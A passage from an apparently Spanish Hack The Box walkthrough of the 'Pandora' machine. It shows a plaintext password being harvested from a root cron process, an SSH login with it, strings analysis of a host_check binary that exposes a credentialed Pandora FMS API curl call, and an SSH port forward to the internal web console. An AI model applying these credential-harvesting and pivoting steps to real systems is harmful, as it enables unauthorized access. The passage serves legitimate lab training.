  &lt;span class=&#34;m&#34;&gt;820&lt;/span&gt;                   zlib1g_1:1.2.11.dfsg-2ubuntu1.2_amd64

 π ~/htb/pandora ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Observamos en uno de los procesos credenciales que son parametro para un script/comando que parece ser un cronjob.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;  &lt;span class=&#34;m&#34;&gt;843&lt;/span&gt;                   runnable              cron                  /usr/sbin/CRON        -f
  &lt;span class=&#34;m&#34;&gt;851&lt;/span&gt;                   runnable              sh                    /bin/sh               -c sleep 30&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /bin/bash -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;/usr/bin/host_check -u daniel -p HotelBabylon23&amp;#39;&lt;/span&gt;
  &lt;span class=&#34;m&#34;&gt;866&lt;/span&gt;                   runnable              atd                   /usr/sbin/atd         -f
  &lt;span class=&#34;m&#34;&gt;872&lt;/span&gt;                   running               snmpd                 /usr/sbin/snmpd       -LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;shell&#34;&gt;Shell&lt;/h2&gt;
&lt;p&gt;Tras utilizar estas credenciales por SSH logramos acceder a la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/pandora ❯ ssh daniel@10.10.11.136 &lt;span class=&#34;c1&#34;&gt;# HotelBabylon23&lt;/span&gt;
daniel@10.10.11.136&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password:
Welcome to Ubuntu 20.04.3 LTS &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GNU/Linux 5.4.0-91-generic x86_64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; Jan 03:05:15 UTC &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt;

  System load:  0.17              Processes:             &lt;span class=&#34;m&#34;&gt;244&lt;/span&gt;
  Usage of /:   75.4% of 4.87GB   Users logged in:       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
  Memory usage: 23%               IPv4 address &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; eth0: 10.10.11.136
  Swap usage:   0%

  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; /boot is using 91.8% of 219MB


&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; updates can be applied immediately.


The list of available updates is more than a week old.
To check &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Jan &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; 00:09:24 &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt; from 10.10.14.11
daniel@pandora:~$ whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; id&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
daniel
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1001&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;daniel&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1001&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;daniel&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1001&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;daniel&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/home/daniel
daniel@pandora:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;pandora-fms&#34;&gt;Pandora FMS&lt;/h1&gt;
&lt;p&gt;Tras enumerar los procesos vemos que uno de ellos ejecutado por el usuario root toma las credenciales de daniel.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;daniel@pandora:~$ ps -ef&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep root
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
root        &lt;span class=&#34;m&#34;&gt;1112&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;857&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 04:20 ?        00:00:00 /usr/bin/host_check -u daniel -p HotelBabylon23
daniel      &lt;span class=&#34;m&#34;&gt;1273&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;1255&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 04:20 pts/0    00:00:00 grep --color&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;auto root
daniel@pandora:~$ ps -ef&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep host
root         &lt;span class=&#34;m&#34;&gt;857&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;819&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 04:19 ?        00:00:00 /bin/sh -c sleep 30&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; /bin/bash -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;/usr/bin/host_check -u daniel -p HotelBabylon23&amp;#39;&lt;/span&gt;
root        &lt;span class=&#34;m&#34;&gt;1112&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;857&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 04:20 ?        00:00:00 /usr/bin/host_check -u daniel -p HotelBabylon23
daniel      &lt;span class=&#34;m&#34;&gt;1275&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;1255&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 04:20 pts/0    00:00:00 grep --color&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;auto host
daniel@pandora:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Revisamos &lt;code&gt;host_check&lt;/code&gt;, observamos que es un ejecutable.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;daniel@pandora:~$ ls -lah /usr/bin/host_check
-rwxr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root 17K Jun &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; /usr/bin/host_check
daniel@pandora:~$ file /usr/bin/host_check
/usr/bin/host_check: ELF 64-bit LSB shared object, x86-64, version &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SYSV&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;]=&lt;/span&gt;c1405fc37fbf335b24d79d20f99671c9b2395cac, &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; GNU/Linux 3.2.0, not stripped
daniel@pandora:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En la maquina no existe el comando &lt;code&gt;strings&lt;/code&gt;, localmente ejecutamos strings al ejecutable, vemos que realiza una consulta utilizando &lt;code&gt;curl&lt;/code&gt; a una dirección local con las credenciales como parametro.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/pandora ❯ strings host_check
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
_ITM_registerTMCloneTable
u/UH
&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;A&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;A^A_
PandoraFMS host check utility
Now attempting to check PandoraFMS registered hosts.
Files will be saved to ~/.host_check
/usr/bin/curl &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://127.0.0.1/pandora_console/include/api.php?op=get&amp;amp;op2=all_agents&amp;amp;return_type=csv&amp;amp;other_mode=url_encode_separator_%7C&amp;amp;user=daniel&amp;amp;pass=HotelBabylon23&amp;#39;&lt;/span&gt; &amp;gt; ~/.host_check 2&amp;gt;/dev/null
Host check unsuccessful!
Please check your credentials.
Terminating program!
Host check successful!
Terminating program!
Ussage: ./host_check -u username -p password.
Two arguments expected.
&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;*3$&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;GCC: (Debian 10.2.1-6) 10.2.1 20210110
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[.. snip ..]
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.data
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.bss
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.comment
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; π ~/htb/pandora ❯
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Esta consulta nos devuelve información, la versión: &lt;code&gt;Pandora FMS Version 7.0NG.742_FIX_PERL2020&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;daniel@pandora:~$ /usr/bin/curl &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://127.0.0.1/pandora_console/include/api.php?op=get&amp;amp;op2=all_agents&amp;amp;return_type=csv&amp;amp;other_mode=url_encode_separator_%7C&amp;amp;user=daniel&amp;amp;pass=HotelBabylon23&amp;#39;&lt;/span&gt;
1&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;localhost.localdomain&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;192.168.1.42&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;Created by localhost.localdomain&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;Linux&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt;09fbaa6fdf35afd44f8266676e4872f299c1d3cbb9846fbe944772d913fcfc69&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
2&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;localhost.localdomain&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt;Pandora FMS Server version 7.0NG.742_FIX_PERL2020&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;Linux&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt;localhost.localdomain&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
daniel@pandora:~
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Únicamente puede ser accedida localmente, además el usuario que esta &amp;lsquo;ejecutando&amp;rsquo; este sitio es &lt;code&gt;matt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;daniel@pandora:~$ curl -s http://127.0.0.1/pandora_console/&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;head
&amp;lt;!DOCTYPE html PUBLIC &lt;span class=&#34;s2&#34;&gt;&amp;#34;-//W3C//DTD XHTML 1.0 Transitional//EN&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&amp;#34;&lt;/span&gt;&amp;gt;
&amp;lt;html &lt;span class=&#34;nv&#34;&gt;xmlns&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://www.w3.org/1999/xhtml&amp;#34;&lt;/span&gt;&amp;gt;
&amp;lt;head&amp;gt;

  &amp;lt;title&amp;gt;Pandora FMS - the Flexible Monitoring System&amp;lt;/title&amp;gt;
    &amp;lt;meta http-equiv&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;expires&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;never&amp;#34;&lt;/span&gt; /&amp;gt;
    &amp;lt;meta http-equiv&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;content-type&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;text/html; charset=utf-8&amp;#34;&lt;/span&gt; /&amp;gt;
    &amp;lt;meta http-equiv&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Content-Style-Type&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;text/css&amp;#34;&lt;/span&gt; /&amp;gt;
    &amp;lt;meta &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;resource-type&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;document&amp;#34;&lt;/span&gt; /&amp;gt;
    &amp;lt;meta &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;distribution&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;global&amp;#34;&lt;/span&gt; /&amp;gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;23&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Failed writing body
daniel@pandora:~$ ls /etc/apache2/sites-available/
000-default.conf  default-ssl.conf  pandora.conf
daniel@pandora:~$ cat /etc/apache2/sites-available/pandora.conf
&amp;lt;VirtualHost localhost:80&amp;gt;
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  &amp;lt;Directory /var/www/pandora&amp;gt;
    AllowOverride All
  &amp;lt;/Directory&amp;gt;
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
&amp;lt;/VirtualHost&amp;gt;
daniel@pandora:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos SSH para obtener el puerto 80 localmente, verificamos con &lt;code&gt;netsat&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# SSH Puerto 80&lt;/span&gt;
sudo ssh -L 80:127.0.0.1:80 daniel@pandora.htb &lt;span class=&#34;c1&#34;&gt;# HotelBabylon23 &lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# netstat&lt;/span&gt;
 π ~/htb/pandora ❯ sudo netstat -ntpl
Active Internet connections &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;only servers&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.1:80            0.0.0.0:*               LISTEN      3168/ssh
tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.1:41431         :::*                    LISTEN      1242/java
tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; ::1:80                  :::*                    LISTEN      3168/ssh
tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.1:8080          :::*                    LISTEN      1242/java
 π ~/htb/pandora ❯
